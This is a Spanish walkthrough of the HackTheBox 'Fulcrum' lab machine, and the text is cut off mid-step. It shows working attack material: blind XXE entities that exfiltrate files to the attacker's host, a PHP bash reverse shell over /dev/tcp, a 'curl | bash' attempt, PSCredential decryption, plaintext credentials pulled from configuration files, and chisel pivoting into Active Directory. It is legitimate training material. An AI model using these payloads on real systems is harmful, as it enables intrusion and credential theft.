---
layout: post
title: Fulcrum
date: 2023-01-30
description:
img:
fig-caption:
tags: [ eWPT, eWPTXv2, eCPPTv2, eCPTXv2, OSWE, OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Fulcrum-htb/Fulcrum_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración de API

* Explotación de XXE avanzada

* Creación de entidades customizadas

* Uso de entidades externas

* Uso de parámetros con entidades XML

* Blind SSRF (Exfiltración de datos - No interpretación de cóidigo)

* XXE + RFI

* Host Discovery (Por ICMP)

* Port Discovery

* Desencriptación de PSCredential

* Pivoting 1 - Remote Port Forwarding

* Information Disclosure

* Enumeración con PowerView.ps1

* Pivotiong 2 - 1 PROXY

* Information Disclosure - Credenciales en scripts de configuración

* Pivoting 3 (DC) - 1 PROXY

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS -vvv 10.10.10.62 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 20:49 GMT
Initiating SYN Stealth Scan at 20:49
Scanning 10.10.10.62 [65535 ports]
Discovered open port 22/tcp on 10.10.10.62
Discovered open port 80/tcp on 10.10.10.62
Discovered open port 4/tcp on 10.10.10.62
Discovered open port 9999/tcp on 10.10.10.62
Discovered open port 56423/tcp on 10.10.10.62
Discovered open port 88/tcp on 10.10.10.62
Completed SYN Stealth Scan at 20:50, 15.64s elapsed (65535 total ports)
Nmap scan report for 10.10.10.62
Host is up, received user-set (0.067s latency).
Scanned at 2023-01-30 20:49:55 GMT for 16s
Not shown: 65500 closed tcp ports (reset), 29 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
4/tcp     open  unknown      syn-ack ttl 63
22/tcp    open  ssh          syn-ack ttl 63
80/tcp    open  http         syn-ack ttl 63
88/tcp    open  kerberos-sec syn-ack ttl 63
9999/tcp  open  abyss        syn-ack ttl 63
56423/tcp open  unknown      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.74 seconds
           Raw packets sent: 83676 (3.682MB) | Rcvd: 77809 (3.112MB)
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p4,22,80,88,9999,56423 10.10.10.62 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 20:48 GMT
Nmap scan report for 10.10.10.62
Host is up (0.097s latency).

PORT      STATE SERVICE VERSION
4/tcp     open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 502 Bad Gateway
88/tcp    open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: phpMyAdmin
9999/tcp  open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: 502 Bad Gateway
56423/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: Fulcrum-API Beta
|_http-title: Site doesn't have a title (application/json;charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.51 seconds
```

## Puerto 4-80-9999-56423 (HTTP)

Con whatweb, analizo las tecnologías que se están empleando por el servidor web

```null
for i in 80 88 9999 56423; do echo -e "\n[+] Puerto $i"; whatweb http://10.10.10.62:$i; done

[+] Puerto 80
http://10.10.10.62:80 [200 OK] ASP_NET[Verbose error messages], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.10.62], Title[Input string was not in a correct format.], nginx[1.18.0]

[+] Puerto 88
http://10.10.10.62:88 [200 OK] Content-Security-Policy[default-src 'self' ;options inline-script eval-script;referrer no-referrer;img-src 'self' data:  *.tile.openstreetmap.org;,default-src 'self' ;script-src 'self'  'unsafe-inline' 'unsafe-eval';referrer no-referrer;style-src 'self' 'unsafe-inline' ;img-src 'self' data:  *.tile.openstreetmap.org;], Cookies[phpMyAdmin,pmaCookieVer,pma_collation_connection,pma_lang], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[phpMyAdmin,pmaCookieVer,pma_collation_connection,pma_lang], IP[10.10.10.62], JQuery, PasswordField[pma_password], Script[text/javascript], Title[phpMyAdmin], UncommonHeaders[x-ob_mode,referrer-policy,content-security-policy,x-content-security-policy,x-webkit-csp,x-content-type-options,x-permitted-cross-domain-policies,x-robots-tag], X-Frame-Options[DENY], X-UA-Compatible[IE=Edge], X-XSS-Protection[1; mode=block], nginx[1.18.0], phpMyAdmin[4.7.4]

[+] Puerto 9999
http://10.10.10.62:9999 [200 OK] ASP_NET[Verbose error messages], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.10.62], Title[Input string was not in a correct format.], nginx[1.18.0]

[+] Puerto 56423
http://10.10.10.62:56423 [200 OK] Country[RESERVED][ZZ], HTTPServer[Fulcrum-API Beta], IP[10.10.10.62]
```

Si los abro en el navegador, veo lo siguiente:

<img src="/writeups/assets/img/Fulcrum-htb/1.png" alt="">

En el puerto 4, si hago click en el enlace me redirige a http://10.10.10.62:4/index.php?page=home. No es vulnerable a LFI ni a RFI ni SSRF (Por ahora). Supongo que le está concatenando la extensión PHP, así que voy a esa ruta desde la raíz, y me aperece un formulario de subida de archivos

<img src="/writeups/assets/img/Fulcrum-htb/2.png" alt="">

Aplico fuzzing para encontrar otras rutas alternativas

```null
gobuster dir -u http://10.10.10.62:4 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x php
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.62:4
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/01/30 21:11:45 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 110]
/home.php             (Status: 200) [Size: 312]
/upload.php           (Status: 200) [Size: 54]
```

Pruebo a subir un archivo que me permita una ejecución remota de comandos, pero da un error.

```null
<?php
  shell_exec($_REQUEST['cmd']);
?>
```

Probando a subir una imagen o un archivo de texto pasa lo mismo, así que lo más probable es que no esté funcional

<img src="/writeups/assets/img/Fulcrum-htb/3.png" alt="">

En el puerto 88, como no tengo credenciales, no puedo hacer nada.



Intercepto la petición por GET tramito a la API por el puerto 56423

<img src="/writeups/assets/img/Fulcrum-htb/4.png" alt="">

Como la respuesta está en JSON, puedo tratar de envíar datos en este formato para ver si cambia la respuesta del servidor, pero se queda igual

<img src="/writeups/assets/img/Fulcrum-htb/5.png" alt="">

Hago lo mismo pero con estructuras en XML, y ahora si obtengo otros resultados

<img src="/writeups/assets/img/Fulcrum-htb/6.png" alt="">

Puedo intentar crear una entidad que me permita cargar el contenido de un archivo interno del sistema, pero la respuesta solo puede mostrar "Ping" o "Pong", así que va a complicarse un poco porque el XXE se efectúa a ciegas, en una nueva etiqueta que creo de mi lado.

<img src="/writeups/assets/img/Fulcrum-htb/7.png" alt="">

Y recibo la conexión

```null
nc -nlvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.62.
Ncat: Connection from 10.10.10.62:41482.
GET /xxe HTTP/1.0
Host: 10.10.14.10
Connection: close
```

Pero para poder intentar cargar un archivo interno, necesitaría crear otra entidad que se encargue de tramitar una petición una petición por GET a mi servidor a través de un SSRF y exfiltrar datos

<img src="/writeups/assets/img/Fulcrum-htb/8.png" alt="">

Vuelvo a efectuar el XXE, pero esta vez pasándole como parámetro la entidad xxe y creo otra nueva que va a apuntar a un fichero XML que alojo de mi lado y así dentro de esa entidad haya otra que permita cargar un archivo de la máquina.

Dentro de ese archivo creo la entidad que corresponde al fichero que quiero tratar de cargar y le añado el parámetro que declaro en el BurpSuite que corresponde al contenido que le estoy pasando a la entidad que se encarga de interpretar todo el archivo XML y mandarme una petición con el contenido en base64.

```null
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param "<!ENTITY pwned SYSTEM 'http://10.10.14.10/%file;'>">
```

<img src="/writeups/assets/img/Fulcrum-htb/9.png" alt="">

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.62 - - [30/Jan/2023 22:09:23] "GET /pwned.xml HTTP/1.0" 200 -
10.10.10.62 - - [30/Jan/2023 22:09:24] code 404, message File not found
10.10.10.62 - - [30/Jan/2023 22:09:24] "GET /cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMDoxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMToxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4OjEwMjoxMDQ6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbiwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDY6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXNsb2c6eDoxMDQ6MTEwOjovaG9tZS9zeXNsb2c6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnRzczp4OjEwNjoxMTE6VFBNIHNvZnR3YXJlIHN0YWNrLCwsOi92YXIvbGliL3RwbTovYmluL2ZhbHNlCnV1aWRkOng6MTA3OjExMjo6L3J1bi91dWlkZDovdXNyL3NiaW4vbm9sb2dpbgp0Y3BkdW1wOng6MTA4OjExMzo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxhbmRzY2FwZTp4OjEwOToxMTU6Oi92YXIvbGliL2xhbmRzY2FwZTovdXNyL3NiaW4vbm9sb2dpbgpwb2xsaW5hdGU6eDoxMTA6MTo6L3Zhci9jYWNoZS9wb2xsaW5hdGU6L2Jpbi9mYWxzZQpzc2hkOng6MTExOjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1jb3JlZHVtcDp4Ojk5OTo5OTk6c3lzdGVtZCBDb3JlIER1bXBlcjovOi91c3Ivc2Jpbi9ub2xvZ2luCmx4ZDp4Ojk5ODoxMDA6Oi92YXIvc25hcC9seGQvY29tbW9uL2x4ZDovYmluL2ZhbHNlCnVzYm11eDp4OjExMjo0Njp1c2JtdXggZGFlbW9uLCwsOi92YXIvbGliL3VzYm11eDovdXNyL3NiaW4vbm9sb2dpbgpkbnNtYXNxOng6MTEzOjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpsaWJ2aXJ0LXFlbXU6eDo2NDA1NToxMDg6TGlidmlydCBRZW11LCwsOi92YXIvbGliL2xpYnZpcnQ6L3Vzci9zYmluL25vbG9naW4KbGlidmlydC1kbnNtYXNxOng6MTE0OjEyMDpMaWJ2aXJ0IERuc21hc3EsLCw6L3Zhci9saWIvbGlidmlydC9kbnNtYXNxOi91c3Ivc2Jpbi9ub2xvZ2luCg== HTTP/1.0" 404 -
```

Me traigo el archivo /proc/net/fib_trie para ver si hay interfaces de red internas a las que de primeras no tengo acceso

```null
cat data | base64 -d | grep LOCAL -B 1| grep -oP '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' | sort -u
10.10.10.62
127.0.0.1
192.168.122.1
```

Podría intentar volver a efectuar un Remote File Inclusión en el puerto 4, pero esta vez pasando por la interfaz loopback de la propia máquina víctima abusando del SSRF por si se da el caso de que pueda cargar un archivo PHP de mi lado.

<img src="/writeups/assets/img/Fulcrum-htb/10.png" alt="">

Y recibo la petición

```null
nc -nlvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.62.
Ncat: Connection from 10.10.10.62:42094.
GET /cmd.php HTTP/1.0
Host: 10.10.14.10
Connection: close
```

Le añado el parámetro cmd que indica el comando que quiero ejecutar a nivel de sistema y me entablo una reverse shell por netcat. Pero tengo problemas ya que me añade la extensión PHP y no sirve un null byte inyection, así que modifico el archivo e indico el comando a ejecutar directamente.

```null
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.62 - - [30/Jan/2023 22:48:26] code 400, message Bad request syntax ('GET /cmd?cmd=curl 10.10.14.10|bash.php HTTP/1.0')
10.10.10.62 - - [30/Jan/2023 22:48:26] "GET /cmd?cmd=curl 10.10.14.10|bash.php HTTP/1.0" 400 -
10.10.10.62 - - [30/Jan/2023 22:48:48] code 404, message File not found
10.10.10.62 - - [30/Jan/2023 22:48:48] "GET /cmd?cmd=wget.php HTTP/1.0" 404 -
```

```null
<?php
  system("bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'");
?>
```

Y gano acceso al sistema

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.62.
Ncat: Connection from 10.10.10.62:37218.
bash: cannot set terminal process group (1085): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fulcrum:~/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@fulcrum:~/uploads$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@fulcrum:~/uploads$ export TERM=xterm
www-data@fulcrum:~/uploads$ export SHELL=bash
www-data@fulcrum:~/uploads$ stty rows 55 columns 209
```

Hay que recordar que tenía otra interfaz asignada, así que aplico un host discovery para encontrar otros equipos conectados a esta red

```null
www-data@fulcrum:~/uploads$ hostname -I
10.10.10.62 192.168.122.1 dead:beef::250:56ff:feb9:17bf
```

Creo un script en bash que lo automatice

```null
www-data@fulcrum:/tmp$ cat hostdiscover.sh 
#!/bin/bash

for i in $(seq 1 255)
  do timeout 1 ping -c 1 192.168.122.$i &>/dev/null && echo "[+] HOST - 192.168.122.$i" &
done; wait
```

Y encuentra una nueva IP

```null
www-data@fulcrum:/tmp$ ./hostdiscover.sh 
[+] HOST - 192.168.122.1
[+] HOST - 192.168.122.228
```

Aplico un escaneo de puertos, directamente desde la bash

```null
www-data@fulcrum:/tmp$ cat portdiscover.sh 
#!/bin/bash

for i in $(seq 1 65535)
  do echo ' ' > /dev/tcp/192.168.122.228/$i &>/dev/null && echo "[+] PORT - $i" &
done; wait
```

Encuentra dos puertos abiertos

```null
www-data@fulcrum:/tmp$ ./hostdiscover.sh 
[+] PORT - 80
[+] PORT - 5985
```

En el directorio uploads hay un script en powershell

```null
www-data@fulcrum:~/uploads$ cat Fulcrum_Upload_to_Corp.ps1 
# TODO: Forward the PowerShell remoting port to the external interface
# Password is now encrypted \o/

$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1
```

Contiene una contraseña en formato SecureString, así que puedo hacer el proceso inverso para obtenerla en texto claro

```null
pwsh
PowerShell 7.3.0
PS /home/rubbx/Desktop/HTB/Machines/Fulcrum> $1 = 'WebUser'                                                        
PS /home/rubbx/Desktop/HTB/Machines/Fulcrum> $2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
PS /home/rubbx/Desktop/HTB/Machines/Fulcrum> $3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA=' 
PS /home/rubbx/Desktop/HTB/Machines/Fulcrum> $4 = $3 | ConvertTo-SecureString -key $2                                                                                                                           
PS /home/rubbx/Desktop/HTB/Machines/Fulcrum> $5 = New-Object System.Management.Automation.PSCredential ($1, $4)         
PS /home/rubbx/Desktop/HTB/Machines/Fulcrum> $Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($4)       
PS /home/rubbx/Desktop/HTB/Machines/Fulcrum> $result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)           
PS /home/rubbx/Desktop/HTB/Machines/Fulcrum> $result
M4ng£m£ntPa55
```

Como el winrm está abierto, si las credenciales son válidas, puedo tratar de conectarme pasando por proxychains

Con chisel me monto un tunel para aplicar Remote Port Forwarding y traerme el puerto 5985 a mi equipo

Primero creo el servidor

```null
chisel server -p 1234 --reverse
```

Y en la máquina víctima me conecto como cliente

```null
www-data@fulcrum:/tmp$ curl 10.10.14.10/chisel -o chisel
www-data@fulcrum:/tmp$ chmod +x chisel
www-data@fulcrum:/tmp$ ./chisel client 10.10.14.10:1234 R:5985:192.168.122.228:5985
```

Y gano acceso como este usuario

```null
evil-winrm -i 127.0.0.1 -u 'webuser' -p 'M4ng£m£ntPa55'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\WebUser\Documents> 

```

Se trata de un entorno de Directorio Activo, por lo que para obtener los máximos privilegios, tengo que llegar al DC

```null
*Evil-WinRM* PS C:\> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WEBSERVER
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 52-54-00-9E-52-F4
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::b1ac:4b69:feac:4a7d%7(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.122.228(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Wednesday, February 1, 2023 12:44:21 PM
   Lease Expires . . . . . . . . . . : Wednesday, February 1, 2023 1:44:21 PM
   Default Gateway . . . . . . . . . : 192.168.122.1
   DHCP Server . . . . . . . . . . . : 192.168.122.1
   DHCPv6 IAID . . . . . . . . . . . : 122835968
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-04-FF-30-52-54-00-74-F8-7C
   DNS Servers . . . . . . . . . . . : 192.168.122.130
                                       1.1.1.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

Para asegurarme de que la IP que corresponde al servidor DNS predeterminado, aplico una resolución con nslookup

```null
*Evil-WinRM* PS C:\> nslookup 192.168.122.130
Server:  DC
Address:  192.168.122.130

Name:    DC
Address:  192.168.122.130
```

Dentro del directorio donde está alojado el IIS, hay un archivo de configuración, con credenciales en texto claro

```null
*Evil-WinRM* PS C:\inetpub\wwwroot> dir


    Directory: C:\inetpub\wwwroot


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/8/2022   2:46 AM            703 iisstart.htm
-a----         5/8/2022   2:46 AM          99710 iisstart.png
-a----        2/12/2022  11:42 PM           5252 index.htm
-a----        2/12/2022  11:42 PM           1280 web.config
```

```null
*Evil-WinRM* PS C:\inetpub\wwwroot> type web.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration xmlns="http://schemas.microsoft.com/.NetConfiguration/v2.0">
    <appSettings />
    <connectionStrings>
        <add connectionString="LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local" name="ADServices" />
    </connectionStrings>
    <system.web>
        <membership defaultProvider="ADProvider">
            <providers>
                <add name="ADProvider" type="System.Web.Security.ActiveDirectoryMembershipProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" connectionStringName="ADConnString" connectionUsername="FULCRUM\LDAP" connectionPassword="PasswordForSearching123!" attributeMapUsername="SAMAccountName" />
            </providers>
        </membership>
    </system.web>
<system.webServer>
   <httpProtocol>
      <customHeaders>
           <clear />
      </customHeaders>
   </httpProtocol>
        <defaultDocument>
            <files>
                <clear />
                <add value="Default.asp" />
                <add value="Default.htm" />
                <add value="index.htm" />
                <add value="index.html" />
                <add value="iisstart.htm" />
            </files>
        </defaultDocument>
</system.webServer>
</configuration>
```

Se está autenticando contra el DC, a través del servicio LDAP, por lo que podría tratar de hacer lo mismo y enumerar usuarios, grupos y otros datos de interés, pero para no tener que hacer de nuevo portforwarding, subo el PowerView por winrm y lo hago todo en local

```null
*Evil-WinRM* PS C:\Temp> upload /opt/PowerSploit/Recon/PowerView.ps1
Info: Uploading /opt/PowerSploit/Recon/PowerView.ps1 to C:\Temp\PowerView.ps1

                                                             
Data: 1027036 bytes of 1027036 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Temp> Import-Module .\PowerView.ps1
```

Creo unas PSCredentials para poder autenticarme

```null
*Evil-WinRM* PS C:\Temp> $SecPassword = ConvertTo-SecureString 'PasswordForSearching123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Temp> $Cred = New-Object System.Management.Automation.PSCredential('FULCRUM\LDAP', $SecPassword)
```

Obtengo todos los usuarios del Directorio Activo

```null
*Evil-WinRM* PS C:\Temp> Get-DomainUser -Credential $Cred | Select samaccountname

samaccountname
--------------
Administrator
Guest
krbtgt
ldap
923a
BTables
```

El usuario 923a pertenece al grupo Domain Admins

```null
*Evil-WinRM* PS C:\Temp> Get-DomainUser -Credential $Cred 923a


company               : fulcrum
logoncount            : 0
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : CN=923a,CN=Users,DC=fulcrum,DC=local
objectclass           : {top, person, organizationalPerson, user}
name                  : 923a
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1104
samaccountname        : 923a
admincount            : 1
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/8/2022 7:10:32 AM
instancetype          : 4
usncreated            : 12610
objectguid            : 8ea0a902-110d-46ec-98b4-825d392c687c
sn                    : 923a
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local
dscorepropagationdata : {5/8/2022 7:10:32 AM, 1/1/1601 12:00:00 AM}
givenname             : 923a
c                     : UK
memberof              : CN=Domain Admins,CN=Users,DC=fulcrum,DC=local
lastlogon             : 12/31/1600 4:00:00 PM
streetaddress         : unknown
badpwdcount           : 0
cn                    : 923a
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:38 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:38 AM
usnchanged            : 12813
postalcode            : 12345
```

Y el usuario BTables tiene la contraseña en su descripción

```null
*Evil-WinRM* PS C:\Temp> Get-DomainUser -Credential $Cred Btables


company               : fulcrum
logoncount            : 1
badpasswordtime       : 12/31/1600 4:00:00 PM
st                    : UN
l                     : unknown
distinguishedname     : CN=BTables,CN=Users,DC=fulcrum,DC=local
objectclass           : {top, person, organizationalPerson, user}
lastlogontimestamp    : 5/9/2022 7:48:46 AM
name                  : BTables
objectsid             : S-1-5-21-1158016984-652700382-3033952538-1105
samaccountname        : BTables
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 5/9/2022 2:48:46 PM
instancetype          : 4
usncreated            : 12628
objectguid            : 8e5db1d3-d28c-4aa1-b49d-f5f8216959fe
sn                    : BTables
info                  : Password set to ++FileServerLogon12345++
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=fulcrum,DC=local
dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : BTables
c                     : UK
lastlogon             : 5/9/2022 7:48:46 AM
streetaddress         : unknown
badpwdcount           : 0
cn                    : BTables
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 5/8/2022 7:02:49 AM
primarygroupid        : 513
pwdlastset            : 5/8/2022 12:02:49 AM
usnchanged            : 16404
lastlogoff            : 12/31/1600 4:00:00 PM
postalcode            : 12345
```

Creo unas PSCredentials para ejecutar comandos como BTables

```null
*Evil-WinRM* PS C:\Users\WebUser\Documents> $Secpass = ConvertTo-SecureString '++FileServerLogon12345++' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\WebUser\Documents> $Cred = New-Object System.Management.Automation.PSCredential('FULCRUM\btables', $Secpass)
```

Como la contraseña hace refencia a un servidor de archivos, pruebo a conectarme a file.fulcrum.local

```null
*Evil-WinRM* PS C:\Users\WebUser\Documents> Invoke-Command -ComputerName file.fulcrum.local -Credential $Cred -ScriptBlock { whoami }
fulcrum\btables
```

No tengo conectividad directa, así que creo un tunel con socat en la máquina linux para redirigir el tráfico que le llegue por un puerto a una sesion de netcat en escucha en mi equipo

```null
